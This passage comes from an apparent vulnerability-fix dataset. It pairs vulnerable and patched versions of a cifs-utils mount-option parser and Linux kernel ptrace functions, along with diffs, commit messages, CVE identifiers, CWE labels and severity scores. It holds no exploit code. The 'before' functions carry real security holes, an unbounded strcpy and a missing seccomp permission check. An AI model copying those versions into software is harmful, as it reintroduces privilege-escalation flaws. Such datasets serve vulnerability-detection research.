						""username specified with no parameter\n"");
					return VAR_26;
				}
			} else {
				strlcpy(VAR_1->username, VAR_2,
					sizeof(VAR_1->username));
				VAR_1->got_user = 1;
				goto nocopy;
			}

		case VAR_32:
			if (VAR_1->got_password) {
				fprintf(VAR_31,
					""password specified twice, ignoring second\n"");
				goto nocopy;
			}
			if (!VAR_2 || !*VAR_2) {
				VAR_1->got_password = 1;
				goto nocopy;
			}
			VAR_9 = set_password(VAR_1, VAR_2);
			if (VAR_9)
				return VAR_9;
			goto nocopy;

		case VAR_33:
			if (VAR_2) {
				if (!strncmp(VAR_2, ""none"", 4))
					VAR_1->got_password = 1;
				if (!strncmp(VAR_2, ""krb5"", 4)) {
					VAR_1->is_krb5 = 1;
					VAR_1->got_password = 1;
				}
			}
			break;

		case VAR_34:
			if (!VAR_2 || !*VAR_2) {
				fprintf(VAR_31,
					""target ip address argument missing\n"");
			} else if (strnlen(VAR_2, VAR_35) <
				VAR_35) {
				strlcpy(VAR_1->addrlist, VAR_2,
					VAR_35);
				if (VAR_1->verboseflag)
					fprintf(VAR_31,
						""ip address %s override specified\n"",
						VAR_2);
				goto nocopy;
			} else {
				fprintf(VAR_31, ""ip address too long\n"");
				return VAR_26;

			}
			break;

		/* COMMENT_14 */
		case VAR_36:
			if (!VAR_2 || !*VAR_2) {
				fprintf(VAR_31,
					""invalid path to network resource\n"");
				return VAR_26;
			}
			VAR_9 = parse_unc(VAR_2, VAR_1, VAR_37);
			if (VAR_9)
				return VAR_9;
			break;

		/* COMMENT_15 */
		case VAR_38:
			if (!VAR_2) {
				/* COMMENT_16 */
                                      
       
				/* COMMENT_19 */
				VAR_1->domain[0] = '\0';
				VAR_1->got_domain = 1;
				goto nocopy;
			}
			if (strnlen(VAR_2, sizeof(VAR_1->domain)) >=
			    sizeof(VAR_1->domain)) {
				fprintf(VAR_31, ""domain name too long\n"");
				return VAR_26;
			}
			strlcpy(VAR_1->domain, VAR_2,
				sizeof(VAR_1->domain));
			goto nocopy;

		case VAR_39:
			if (!VAR_2 || !*VAR_2) {
				fprintf(VAR_31,
					""invalid credential file name specified\n"");
				return VAR_26;
			}
			VAR_9 = open_cred_file(VAR_2, VAR_1);
			if (VAR_9) {
				fprintf(VAR_31,
					""error %d (%s) opening credential file %s\n"",
					VAR_9, strerror(VAR_9), VAR_2);
				return VAR_9;
			}
			goto nocopy;

		case VAR_40:
			if (!VAR_2 || !*VAR_2)
				goto nocopy;

			VAR_12 = 1;
			VAR_22 = getpwnam(VAR_2);
			if (VAR_22) {
				VAR_16 = VAR_22->pw_uid;
				goto nocopy;
			}

			VAR_41 = 0;
			VAR_16 = strtoul(VAR_2, &VAR_21, 10);
			if (VAR_41 == 0 && *VAR_21 == '\0')
				goto nocopy;

			fprintf(VAR_31, ""bad option uid=\""%s\""\n"", VAR_2);
			return VAR_26;
		case VAR_42:
			if (!VAR_2 || !*VAR_2)
				goto nocopy;

			VAR_13 = 1;
			VAR_22 = getpwnam(VAR_2);
			if (VAR_22) {
				VAR_17 = VAR_22->pw_uid;
				goto nocopy;
			}

			VAR_41 = 0;
			VAR_17 = strtoul(VAR_2, &VAR_21, 10);
			if (VAR_41 == 0 && *VAR_21 == '\0')
				goto nocopy;

			fprintf(VAR_31, ""bad option: cruid=\""%s\""\n"", VAR_2);
			return VAR_26;
		case VAR_43:
			if (!VAR_2 || !*VAR_2)
				goto nocopy;

			VAR_14 = 1;
			VAR_23 = getgrnam(VAR_2);
			if (VAR_23) {
				VAR_19 = VAR_23->gr_gid;
				goto nocopy;
			}

			VAR_41 = 0;
			VAR_19 = strtoul(VAR_2, &VAR_21, 10);
			if (VAR_41 == 0 && *VAR_21 == '\0')
				goto nocopy;

			fprintf(VAR_31, ""bad option: gid=\""%s\""\n"", VAR_2);
			return VAR_26;
		/* COMMENT_20 */
		case VAR_44:
			fprintf(VAR_31,
				""WARNING: CIFS mount option 'fmask' is\
				 deprecated. Use 'file_mode' instead.\n"");
			VAR_0 = ""file_mode"";	/* COMMENT_21 */
			/* COMMENT_22 */
		case VAR_45:
			if (!VAR_2 || !*VAR_2) {
				fprintf(VAR_31,
					""Option '%s' requires a numerical argument\n"",
					VAR_0);
				return VAR_26;
			}

			if (VAR_2[0] != '0')
				fprintf(VAR_31,
					""WARNING: '%s' not expressed in octal.\n"",
					VAR_0);
			break;

		/* COMMENT_23 */
		case VAR_46:
			fprintf(VAR_31,
				""WARNING: CIFS mount option 'dmask' is\
				 deprecated. Use 'dir_mode' instead.\n"");
			VAR_0 = ""dir_mode"";
			/* COMMENT_22 */
		case VAR_47:
			if (!VAR_2 || !*VAR_2) {
				fprintf(VAR_31,
					""Option '%s' requires a numerical argument\n"",
					VAR_0);
				return VAR_26;
			}

			if (VAR_2[0] != '0')
				fprintf(VAR_31,
					""WARNING: '%s' not expressed in octal.\n"",
					VAR_0);
			break;
		case VAR_48:
			*VAR_6 |= VAR_49;
			goto nocopy;
		case VAR_50:
			*VAR_6 &= ~VAR_49;
			goto nocopy;
		case VAR_51:
			*VAR_6 |= VAR_52;
			goto nocopy;
		case VAR_53:
			*VAR_6 &= ~VAR_54;
			break;
		case VAR_55:
			*VAR_6 |= VAR_54;
			goto nocopy;
		case VAR_56:
			*VAR_6 &= ~VAR_54;
			goto nocopy;
		case VAR_57:
			*VAR_6 &= ~VAR_52;
			goto nocopy;
		case VAR_58:
			*VAR_6 |= VAR_59;
			goto nocopy;
		case VAR_60:
			*VAR_6 &= ~VAR_59;
			goto nocopy;
		case VAR_61:
			VAR_1->got_user = 1;
			VAR_1->got_password = 1;
			goto nocopy;
		case VAR_62:
			*VAR_6 |= VAR_63;
			goto nocopy;
		case VAR_64:
			*VAR_6 &= ~VAR_63;
			goto nocopy;
		case VAR_65:
			*VAR_6 |= VAR_66;
			goto nocopy;
		case VAR_67:
			goto nocopy;
		case VAR_68:
			if (!VAR_2 || !*VAR_2)
				goto nocopy;

			VAR_10 = 1;
			VAR_41 = 0;
			VAR_18 = strtoul(VAR_2, &VAR_21, 10);
			if (VAR_41 == 0 && *VAR_21 == '\0')
				goto nocopy;

			VAR_22 = getpwnam(VAR_2);
			if (VAR_22 == NULL) {
				fprintf(VAR_31,
					""bad user name \""%s\""\n"", VAR_2);
				return VAR_26;
			}

			VAR_18 = VAR_22->pw_uid;
			goto nocopy;
		case VAR_69:
			if (!VAR_2 || !*VAR_2)
				goto nocopy;

			VAR_11 = 1;
			VAR_41 = 0;
			VAR_20 = strtoul(VAR_2, &VAR_21, 10);
			if (VAR_41 == 0 && *VAR_21 == '\0')
				goto nocopy;

			VAR_23 = getgrnam(VAR_2);
			if (VAR_23 == NULL) {
				fprintf(VAR_31,
					""bad group name \""%s\""\n"", VAR_2);
				return VAR_26;
			}

			VAR_20 = VAR_23->gr_gid;
			goto nocopy;
		case VAR_70:
			VAR_1->nofail = 1;
			goto nocopy;
		case VAR_71:
			if (!VAR_2 || !*VAR_2)
				goto nocopy;
			if (strncmp(VAR_2, ""@GMT-"", 5))
				break;
			if ((strlen(VAR_2) != VAR_72) ||
			    (strptime(VAR_2, VAR_73, &tm) == NULL)) {
				fprintf(VAR_31, ""bad snapshot token\n"");
				return VAR_26;
			}
			VAR_25 = timegm(&tm) * 10000000 + VAR_74;
			VAR_15 = 1;
			goto nocopy;
		}

		/* COMMENT_24 */
		VAR_8 = strlen(VAR_0);
		if (VAR_2)
			VAR_8 += 1 + strlen(VAR_2);

		/* COMMENT_25 */
		if (VAR_7 + VAR_8 + 2 > VAR_75) {
			fprintf(VAR_31, ""Options string too long\n"");
			return VAR_26;
		}

		/* COMMENT_26 */
		if (VAR_3)
			*VAR_3 = '=';

		/* COMMENT_27 */
		if (VAR_7)
			strlcat(VAR_5, "","", VAR_75);

		strlcat(VAR_5, VAR_0, VAR_75);
		VAR_7 = strlen(VAR_5);
nocopy:
		VAR_0 = VAR_4;
	}


	/* COMMENT_28 */
	if (VAR_12) {
		VAR_8 = snprintf(VAR_24, sizeof(VAR_24), ""%u"", VAR_16);

		/* COMMENT_29 */
		if (VAR_7 + VAR_8 + 6 > VAR_75) {
			fprintf(VAR_31, ""Options string too long\n"");
			return VAR_26;
		}

		if (VAR_7) {
			strlcat(VAR_5, "","", VAR_75);
			VAR_7++;
		}
		snprintf(VAR_5 + VAR_7, VAR_8 + 5, ""uid=%s"", VAR_24);
		VAR_7 = strlen(VAR_5);
	}
	if (VAR_1->is_krb5 && VAR_1->sudo_uid) {
		VAR_17 = VAR_1->sudo_uid;
		VAR_13 = 1;
	}
	if (VAR_13) {
		VAR_8 = snprintf(VAR_24, sizeof(VAR_24), ""%u"", VAR_17);

		/* COMMENT_30 */
		if (VAR_7 + VAR_8 + 8 > VAR_75) {
			fprintf(VAR_31, ""Options string too long\n"");
			return VAR_26;
		}

		if (VAR_7) {
			strlcat(VAR_5, "","", VAR_75);
			VAR_7++;
		}
		snprintf(VAR_5 + VAR_7, VAR_8 + 7, ""cruid=%s"", VAR_24);
		VAR_7 = strlen(VAR_5);
	}
	if (VAR_14) {
		VAR_8 = snprintf(VAR_24, sizeof(VAR_24), ""%u"", VAR_19);

		/* COMMENT_31 */
		if (VAR_7 + VAR_8 + 6 > VAR_75) {
			fprintf(VAR_31, ""Options string too long\n"");
			return VAR_26;
		}

		if (VAR_7) {
			strlcat(VAR_5, "","", VAR_75);
			VAR_7++;
		}
		snprintf(VAR_5 + VAR_7, VAR_8 + 5, ""gid=%s"", VAR_24);
		VAR_7 = strlen(VAR_5);
	}
	if (VAR_10) {
		VAR_8 = snprintf(VAR_24, sizeof(VAR_24), ""%u"", VAR_18);

		/* COMMENT_32 */
		if (VAR_7 + VAR_8 + 12 > VAR_75) {
			fprintf(VAR_31, ""Options string too long\n"");
			return VAR_26;
		}

		if (VAR_7) {
			strlcat(VAR_5, "","", VAR_75);
			VAR_7++;
		}
		snprintf(VAR_5 + VAR_7, VAR_8 + 11, ""backupuid=%s"", VAR_24);
		VAR_7 = strlen(VAR_5);
	}
	if (VAR_11) {
		VAR_8 = snprintf(VAR_24, sizeof(VAR_24), ""%u"", VAR_20);

		/* COMMENT_33 */
		if (VAR_7 + VAR_8 + 12 > VAR_75) {
			fprintf(VAR_31, ""Options string too long\n"");
			return VAR_26;
		}

		if (VAR_7) {
			strlcat(VAR_5, "","", VAR_75);
			VAR_7++;
		}
		snprintf(VAR_5 + VAR_7, VAR_8 + 11, ""backupgid=%s"", VAR_24);
		VAR_7 = strlen(VAR_5);
	}
	if (VAR_15) {
		VAR_8 = snprintf(VAR_24, sizeof(VAR_24), ""%llu"", VAR_25);

		/* COMMENT_34 */
		if (VAR_7 + VAR_8 + 11 > VAR_75) {
			fprintf(VAR_31, ""Options string too long\n"");
			return VAR_26;
		}

		if (VAR_7) {
			strlcat(VAR_5, "","", VAR_75);
			VAR_7++;
		}
		snprintf(VAR_5 + VAR_7, VAR_8 + 10, ""snapshot=%s"", VAR_24);
		VAR_7 = strlen(VAR_5);
	}

	return 0;
}",piastry/cifs-utils/955fb147e97a6a74e1aaa65766de91e2c1479765/mount.cifs.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -117,9 +117,10 @@
 			if (!value || !*value) {
 				fprintf(stderr,
 					""target ip address argument missing\n"");
-			} else if (strnlen(value, MAX_ADDRESS_LEN) <=
+			} else if (strnlen(value, MAX_ADDRESS_LEN) <
 				MAX_ADDRESS_LEN) {
-				strcpy(parsed_info->addrlist, value);
+				strlcpy(parsed_info->addrlist, value,
+					MAX_ADDRESS_LEN);
 				if (parsed_info->verboseflag)
 					fprintf(stderr,
 						""ip address %s override specified\n"",","{'deleted_lines': ['\t\t\t} else if (strnlen(value, MAX_ADDRESS_LEN) <=', '\t\t\t\tstrcpy(parsed_info->addrlist, value);'], 'added_lines': ['\t\t\t} else if (strnlen(value, MAX_ADDRESS_LEN) <', '\t\t\t\tstrlcpy(parsed_info->addrlist, value,', '\t\t\t\t\tMAX_ADDRESS_LEN);']}",True,"In cifs-utils through 6.14, a stack-based buffer overflow when parsing the mount.cifs ip= command-line argument could lead to local attackers gaining root privileges.",7.8,HIGH,2,valid,2022-03-17T16:58:52Z,4
CVE-2022-30594,['CWE-862'],AV:L/AC:M/Au:N/C:P/I:P/A:P,0,torvalds/linux,"ptrace: Check PTRACE_O_SUSPEND_SECCOMP permission on PTRACE_SEIZE

Setting PTRACE_O_SUSPEND_SECCOMP is supposed to be a highly privileged
operation because it allows the tracee to completely bypass all seccomp
filters on kernels with CONFIG_CHECKPOINT_RESTORE=y. It is only supposed to
be settable by a process with global CAP_SYS_ADMIN, and only if that
process is not subject to any seccomp filters at all.

However, while these permission checks were done on the PTRACE_SETOPTIONS
path, they were missing on the PTRACE_SEIZE path, which also sets
user-specified ptrace flags.

Move the permissions checks out into a helper function and let both
ptrace_attach() and ptrace_setoptions() call it.

Cc: stable@kernel.org
Fixes: 13c4a90119d2 (""seccomp: add ptrace options for suspend/resume"")
Signed-off-by: Jann Horn <jannh@google.com>
Link: https://lkml.kernel.org/r/20220319010838.1386861-1-jannh@google.com
Signed-off-by: Eric W. Biederman <ebiederm@xmission.com>",ee1fee900537b5d9560e9f937402de5ddc8412f3,https://github.com/torvalds/linux/commit/ee1fee900537b5d9560e9f937402de5ddc8412f3,kernel/ptrace.c,ptrace_setoptions,"static int ptrace_setoptions(struct task_struct *child, unsigned long data)
{
unsigned flags;
if (data & ~(unsigned long)PTRACE_O_MASK)
return -EINVAL;
if (unlikely(data & PTRACE_O_SUSPEND_SECCOMP)) {
if (!IS_ENABLED(CONFIG_CHECKPOINT_RESTORE) ||
!IS_ENABLED(CONFIG_SECCOMP))
return -EINVAL;
if (!capable(CAP_SYS_ADMIN))
return -EPERM;
if (seccomp_mode(&current->seccomp) != SECCOMP_MODE_DISABLED ||
current->ptrace & PT_SUSPEND_SECCOMP)
return -EPERM;
}
flags = child->ptrace;
flags &= ~(PTRACE_O_MASK << PT_OPT_FLAG_SHIFT);
flags |= (data << PT_OPT_FLAG_SHIFT);
child->ptrace = flags;
return 0;
}","static int ptrace_setoptions(struct task_struct *VAR_0, unsigned long VAR_1)
{
unsigned VAR_2;
if (VAR_1 & ~(unsigned long)VAR_3)
return -VAR_4;
if (unlikely(VAR_1 & VAR_5)) {
if (!IS_ENABLED(VAR_6) ||
!IS_ENABLED(VAR_7))
return -VAR_4;
if (!capable(VAR_8))
return -VAR_9;
if (seccomp_mode(&VAR_10->seccomp) != VAR_11 ||
VAR_10->ptrace & VAR_12)
return -VAR_9;
}
VAR_2 = VAR_0->ptrace;
VAR_2 &= ~(VAR_3 << VAR_13);
VAR_2 |= (VAR_1 << VAR_13);
VAR_0->ptrace = VAR_2;
return 0;
}",torvalds/linux/ee1fee900537b5d9560e9f937402de5ddc8412f3/ptrace.c/vul/before/0.json,"static int ptrace_setoptions(struct task_struct *child, unsigned long data)
{
	unsigned flags;
	int ret;

	ret = check_ptrace_options(data);
	if (ret)
		return ret;

	/* Avoid intermediate state when all opts are cleared */
	flags = child->ptrace;
	flags &= ~(PTRACE_O_MASK << PT_OPT_FLAG_SHIFT);
	flags |= (data << PT_OPT_FLAG_SHIFT);
	child->ptrace = flags;

	return 0;
}","static int ptrace_setoptions(struct task_struct *VAR_0, unsigned long VAR_1)
{
	unsigned VAR_2;
	int VAR_3;

	VAR_3 = check_ptrace_options(VAR_1);
	if (VAR_3)
		return VAR_3;

	/* COMMENT_0 */
	VAR_2 = VAR_0->ptrace;
	VAR_2 &= ~(VAR_4 << VAR_5);
	VAR_2 |= (VAR_1 << VAR_5);
	VAR_0->ptrace = VAR_2;

	return 0;
}",torvalds/linux/ee1fee900537b5d9560e9f937402de5ddc8412f3/ptrace.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -1,22 +1,11 @@
 static int ptrace_setoptions(struct task_struct *child, unsigned long data)
 {
 	unsigned flags;
+	int ret;
 
-	if (data & ~(unsigned long)PTRACE_O_MASK)
-		return -EINVAL;
-
-	if (unlikely(data & PTRACE_O_SUSPEND_SECCOMP)) {
-		if (!IS_ENABLED(CONFIG_CHECKPOINT_RESTORE) ||
-		    !IS_ENABLED(CONFIG_SECCOMP))
-			return -EINVAL;
-
-		if (!capable(CAP_SYS_ADMIN))
-			return -EPERM;
-
-		if (seccomp_mode(&current->seccomp) != SECCOMP_MODE_DISABLED ||
-		    current->ptrace & PT_SUSPEND_SECCOMP)
-			return -EPERM;
-	}
+	ret = check_ptrace_options(data);
+	if (ret)
+		return ret;
 
 	/* Avoid intermediate state when all opts are cleared */
 	flags = child->ptrace;","{'deleted_lines': ['\tif (data & ~(unsigned long)PTRACE_O_MASK)', '\t\treturn -EINVAL;', '', '\tif (unlikely(data & PTRACE_O_SUSPEND_SECCOMP)) {', '\t\tif (!IS_ENABLED(CONFIG_CHECKPOINT_RESTORE) ||', '\t\t    !IS_ENABLED(CONFIG_SECCOMP))', '\t\t\treturn -EINVAL;', '', '\t\tif (!capable(CAP_SYS_ADMIN))', '\t\t\treturn -EPERM;', '', '\t\tif (seccomp_mode(&current->seccomp) != SECCOMP_MODE_DISABLED ||', '\t\t    current->ptrace & PT_SUSPEND_SECCOMP)', '\t\t\treturn -EPERM;', '\t}'], 'added_lines': ['\tint ret;', '\tret = check_ptrace_options(data);', '\tif (ret)', '\t\treturn ret;']}",True,The Linux kernel before 5.17.2 mishandles seccomp permissions. The PTRACE_SEIZE code path allows attackers to bypass intended restrictions on setting the PT_SUSPEND_SECCOMP flag.,7.8,HIGH,2,valid,2022-03-19T01:08:37Z,4
CVE-2022-30594,['CWE-862'],AV:L/AC:M/Au:N/C:P/I:P/A:P,0,torvalds/linux,"ptrace: Check PTRACE_O_SUSPEND_SECCOMP permission on PTRACE_SEIZE

Setting PTRACE_O_SUSPEND_SECCOMP is supposed to be a highly privileged
operation because it allows the tracee to completely bypass all seccomp
filters on kernels with CONFIG_CHECKPOINT_RESTORE=y. It is only supposed to
be settable by a process with global CAP_SYS_ADMIN, and only if that
process is not subject to any seccomp filters at all.

However, while these permission checks were done on the PTRACE_SETOPTIONS
path, they were missing on the PTRACE_SEIZE path, which also sets
user-specified ptrace flags.

Move the permissions checks out into a helper function and let both
ptrace_attach() and ptrace_setoptions() call it.

Cc: stable@kernel.org
Fixes: 13c4a90119d2 (""seccomp: add ptrace options for suspend/resume"")
Signed-off-by: Jann Horn <jannh@google.com>
Link: https://lkml.kernel.org/r/20220319010838.1386861-1-jannh@google.com
Signed-off-by: Eric W. Biederman <ebiederm@xmission.com>",ee1fee900537b5d9560e9f937402de5ddc8412f3,https://github.com/torvalds/linux/commit/ee1fee900537b5d9560e9f937402de5ddc8412f3,kernel/ptrace.c,ptrace_attach,"static int ptrace_attach(struct task_struct *task, long request,
unsigned long addr,
unsigned long flags)
{
bool seize = (request == PTRACE_SEIZE);
int retval;
retval = -EIO;
if (seize) {
if (addr != 0)
goto out;
if (flags & ~(unsigned long)PTRACE_O_MASK)
goto out;
flags = PT_PTRACED | PT_SEIZED | (flags << PT_OPT_FLAG_SHIFT);
} else {
flags = PT_PTRACED;
}
audit_ptrace(task);
retval = -EPERM;
if (unlikely(task->flags & PF_KTHREAD))
goto out;
if (same_thread_group(task, current))
goto out;
retval = -ERESTARTNOINTR;
if (mutex_lock_interruptible(&task->signal->cred_guard_mutex))
goto out;
task_lock(task);
retval = __ptrace_may_access(task, PTRACE_MODE_ATTACH_REALCREDS);
task_unlock(task);
if (retval)
goto unlock_creds;
write_lock_irq(&tasklist_lock);
retval = -EPERM;
if (unlikely(task->exit_state))
goto unlock_tasklist;
if (task->ptrace)
goto unlock_tasklist;
task->ptrace = flags;
ptrace_link(task, current);
if (!seize)
send_sig_info(SIGSTOP, SEND_SIG_PRIV, task);
spin_lock(&task->sighand->siglock);
if (task_is_stopped(task) &&
task_set_jobctl_pending(task, JOBCTL_TRAP_STOP | JOBCTL_TRAPPING))
signal_wake_up_state(task, __TASK_STOPPED);
spin_unlock(&task->sighand->siglock);
retval = 0;
unlock_tasklist:
write_unlock_irq(&tasklist_lock);
unlock_creds:
mutex_unlock(&task->signal->cred_guard_mutex);
out:
if (!retval) {
wait_on_bit(&task->jobctl, JOBCTL_TRAPPING_BIT, TASK_KILLABLE);
proc_ptrace_connector(task, PTRACE_ATTACH);
}
return retval;
}","static int ptrace_attach(struct task_struct *VAR_0, long VAR_1,
unsigned long VAR_2,
unsigned long VAR_3)
{
bool VAR_4 = (VAR_1 == VAR_5);
int VAR_6;
VAR_6 = -VAR_7;
if (VAR_4) {
if (VAR_2 != 0)
goto out;
if (VAR_3 & ~(unsigned long)VAR_8)
goto out;
VAR_3 = VAR_9 | VAR_10 | (VAR_3 << VAR_11);
} else {
VAR_3 = VAR_9;
}
audit_ptrace(VAR_0);
VAR_6 = -VAR_12;
if (unlikely(VAR_0->flags & VAR_13))
goto out;
if (same_thread_group(VAR_0, VAR_14))
goto out;
VAR_6 = -VAR_15;
if (mutex_lock_interruptible(&VAR_0->signal->cred_guard_mutex))
goto out;
task_lock(VAR_0);
VAR_6 = __ptrace_may_access(VAR_0, VAR_16);
task_unlock(VAR_0);
if (VAR_6)
goto unlock_creds;
write_lock_irq(&VAR_17);
VAR_6 = -VAR_12;
if (unlikely(VAR_0->exit_state))
goto unlock_tasklist;
if (VAR_0->ptrace)
goto unlock_tasklist;
VAR_0->ptrace = VAR_3;
ptrace_link(VAR_0, VAR_14);
if (!VAR_4)
send_sig_info(VAR_18, VAR_19, VAR_0);
spin_lock(&VAR_0->sighand->siglock);
if (task_is_stopped(VAR_0) &&
task_set_jobctl_pending(VAR_0, VAR_20 | VAR_21))
signal_wake_up_state(VAR_0, VAR_22);
spin_unlock(&VAR_0->sighand->siglock);
VAR_6 = 0;
unlock_tasklist:
write_unlock_irq(&VAR_17);
unlock_creds:
mutex_unlock(&VAR_0->signal->cred_guard_mutex);
out:
if (!VAR_6) {
wait_on_bit(&VAR_0->jobctl, VAR_23, VAR_24);
proc_ptrace_connector(VAR_0, VAR_25);
}
return VAR_6;
}",torvalds/linux/ee1fee900537b5d9560e9f937402de5ddc8412f3/ptrace.c/vul/before/1.json,"static int ptrace_attach(struct task_struct *task, long request,
			 unsigned long addr,
			 unsigned long flags)
{
	bool seize = (request == PTRACE_SEIZE);
	int retval;

	retval = -EIO;
	if (seize) {
		if (addr != 0)
			goto out;
		/*
		 * This duplicates the check in check_ptrace_options() because
		 * ptrace_attach() and ptrace_setoptions() have historically
		 * used different error codes for unknown ptrace options.
		 */
		if (flags & ~(unsigned long)PTRACE_O_MASK)
			goto out;
		retval = check_ptrace_options(flags);
		if (retval)
			return retval;
		flags = PT_PTRACED | PT_SEIZED | (flags << PT_OPT_FLAG_SHIFT);
	} else {
		flags = PT_PTRACED;
	}

	audit_ptrace(task);

	retval = -EPERM;
	if (unlikely(task->flags & PF_KTHREAD))
		goto out;
	if (same_thread_group(task, current))
		goto out;

	/*
	 * Protect exec's credential calculations against our interference;
	 * SUID, SGID and LSM creds get determined differently
	 * under ptrace.
	 */
	retval = -ERESTARTNOINTR;
	if (mutex_lock_interruptible(&task->signal->cred_guard_mutex))
		goto out;

	task_lock(task);
	retval = __ptrace_may_access(task, PTRACE_MODE_ATTACH_REALCREDS);
	task_unlock(task);
	if (retval)
		goto unlock_creds;

	write_lock_irq(&tasklist_lock);
	retval = -EPERM;
	if (unlikely(task->exit_state))
		goto unlock_tasklist;
	if (task->ptrace)
		goto unlock_tasklist;

	task->ptrace = flags;

	ptrace_link(task, current);

	/* SEIZE doesn't trap tracee on attach */
	if (!seize)
		send_sig_info(SIGSTOP, SEND_SIG_PRIV, task);

	spin_lock(&task->sighand->siglock);

	/*
	 * If the task is already STOPPED, set JOBCTL_TRAP_STOP and
	 * TRAPPING, and kick it so that it transits to TRACED.  TRAPPING
	 * will be cleared if the child completes the transition or any
	 * event which clears the group stop states happens.  We'll wait
	 * for the transition to complete before returning from this
	 * function.
	 *
	 * This hides STOPPED -> RUNNING -> TRACED transition from the
	 * attaching thread but a different thread in the same group can
	 * still observe the transient RUNNING state.  IOW, if another
	 * thread's WNOHANG wait(2) on the stopped tracee races against
	 * ATTACH, the wait(2) may fail due to the transient RUNNING.
	 *
	 * The following task_is_stopped() test is safe as both transitions
	 * in and out of STOPPED are protected by siglock.
	 */
	if (task_is_stopped(task) &&
	    task_set_jobctl_pending(task, JOBCTL_TRAP_STOP | JOBCTL_TRAPPING))
		signal_wake_up_state(task, __TASK_STOPPED);

	spin_unlock(&task->sighand->siglock);

	retval = 0;
unlock_tasklist:
	write_unlock_irq(&tasklist_lock);
unlock_creds:
	mutex_unlock(&task->signal->cred_guard_mutex);
out:
	if (!retval) {
		/*
		 * We do not bother to change retval or clear JOBCTL_TRAPPING
		 * if wait_on_bit() was interrupted by SIGKILL. The tracer will
		 * not return to user-mode, it will exit and clear this bit in
		 * __ptrace_unlink() if it wasn't already cleared by the tracee;
		 * and until then nobody can ptrace this task.
		 */
		wait_on_bit(&task->jobctl, JOBCTL_TRAPPING_BIT, TASK_KILLABLE);
		proc_ptrace_connector(task, PTRACE_ATTACH);
	}

	return retval;
}","static int ptrace_attach(struct task_struct *VAR_0, long VAR_1,
			 unsigned long VAR_2,
			 unsigned long VAR_3)
{
	bool VAR_4 = (VAR_1 == VAR_5);
	int VAR_6;

	VAR_6 = -VAR_7;
	if (VAR_4) {
		if (VAR_2 != 0)
			goto out;
		/* COMMENT_0 */
                                                                
                                                              
                                                           
     
		if (VAR_3 & ~(unsigned long)VAR_8)
			goto out;
		VAR_6 = check_ptrace_options(VAR_3);
		if (VAR_6)
			return VAR_6;
		VAR_3 = VAR_9 | VAR_10 | (VAR_3 << VAR_11);
	} else {
		VAR_3 = VAR_9;
	}

	audit_ptrace(VAR_0);

	VAR_6 = -VAR_12;
	if (unlikely(VAR_0->flags & VAR_13))
		goto out;
	if (same_thread_group(VAR_0, VAR_14))
		goto out;

	/* COMMENT_5 */
                                                                    
                                                       
                 
    
	VAR_6 = -VAR_15;
	if (mutex_lock_interruptible(&VAR_0->signal->cred_guard_mutex))
		goto out;

	task_lock(VAR_0);
	VAR_6 = __ptrace_may_access(VAR_0, VAR_16);
	task_unlock(VAR_0);
	if (VAR_6)
		goto unlock_creds;

	write_lock_irq(&VAR_17);
	VAR_6 = -VAR_12;
	if (unlikely(VAR_0->exit_state))
		goto unlock_tasklist;
	if (VAR_0->ptrace)
		goto unlock_tasklist;

	VAR_0->ptrace = VAR_3;

	ptrace_link(VAR_0, VAR_14);

	/* COMMENT_10 */
	if (!VAR_4)
		send_sig_info(VAR_18, VAR_19, VAR_0);

	spin_lock(&VAR_0->sighand->siglock);

	/* COMMENT_11 */
                                                            
                                                                  
                                                                
                                                                 
                                                             
             
   
                                                               
                                                                 
                                                               
                                                                
                                                              
   
                                                                    
                                                   
    
	if (task_is_stopped(VAR_0) &&
	    task_set_jobctl_pending(VAR_0, VAR_20 | VAR_21))
		signal_wake_up_state(VAR_0, VAR_22);

	spin_unlock(&VAR_0->sighand->siglock);

	VAR_6 = 0;
unlock_tasklist:
	write_unlock_irq(&VAR_17);
unlock_creds:
	mutex_unlock(&VAR_0->signal->cred_guard_mutex);
out:
	if (!VAR_6) {
		/* COMMENT_27 */
                                                               
                                                                 
                                                                
                                                                  
                                                
     
		wait_on_bit(&VAR_0->jobctl, VAR_23, VAR_24);
		proc_ptrace_connector(VAR_0, VAR_25);
	}

	return VAR_6;
}",torvalds/linux/ee1fee900537b5d9560e9f937402de5ddc8412f3/ptrace.c/vul/after/1.json,"--- func_before
+++ func_after
@@ -9,8 +9,16 @@
 	if (seize) {
 		if (addr != 0)
 			goto out;
+		/*
+		 * This duplicates the check in check_ptrace_options() because
+		 * ptrace_attach() and ptrace_setoptions() have historically
+		 * used different error codes for unknown ptrace options.
+		 */
 		if (flags & ~(unsigned long)PTRACE_O_MASK)
 			goto out;
+		retval = check_ptrace_options(flags);
+		if (retval)
+			return retval;
 		flags = PT_PTRACED | PT_SEIZED | (flags << PT_OPT_FLAG_SHIFT);
 	} else {
 		flags = PT_PTRACED;","{'deleted_lines': [], 'added_lines': ['\t\t/*', '\t\t * This duplicates the check in check_ptrace_options() because', '\t\t * ptrace_attach() and ptrace_setoptions() have historically', '\t\t * used different error codes for unknown ptrace options.', '\t\t */', '\t\tretval = check_ptrace_options(flags);', '\t\tif (retval)', '\t\t\treturn retval;']}",True,The Linux kernel before 5.17.2 mishandles seccomp permissions. The PTRACE_SEIZE code path allows attackers to bypass intended restrictions on setting the PT_SUSPEND_SECCOMP flag.,7.8,HIGH,2,valid,2022-03-19T01:08:37Z,4
CVE-2022-3202,['CWE-476'],CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:H,1,torvalds/linux,"jfs: prevent NULL deref in diFree

Add validation check for JFS_IP(ipimap)->i_imap to prevent a NULL deref
in diFree since diFree uses it without do any validations.
When function jfs_mount calls diMount to initialize fileset inode
allocation map, it can fail and JFS_IP(ipimap)->i_imap won't be
initialized. Then it calls diFreeSpecial to close fileset inode allocation
map inode and it will flow into jfs_evict_inode. Function jfs_evict_inode
just validates JFS_SBI(inode->i_sb)->ipimap, then calls diFree. diFree use
JFS_IP(ipimap)->i_imap directly, then it will cause a NULL deref.

Reported-by: TCS Robot <tcs_robot@tencent.com>
Signed-off-by: Haimin Zhang <tcs_kernel@tencent.com>
Signed-off-by: Dave Kleikamp <dave.kleikamp@oracle.com>",a53046291020ec41e09181396c1e829287b48d47,https://github.com/torvalds/linux/commit/a53046291020ec41e09181396c1e829287b48d47,fs/jfs/inode.c,jfs_evict_inode,"void jfs_evict_inode(struct inode *inode)
{
struct jfs_inode_info *ji = JFS_IP(inode);
jfs_info(""In jfs_evict_inode, inode = 0x%p"", inode);
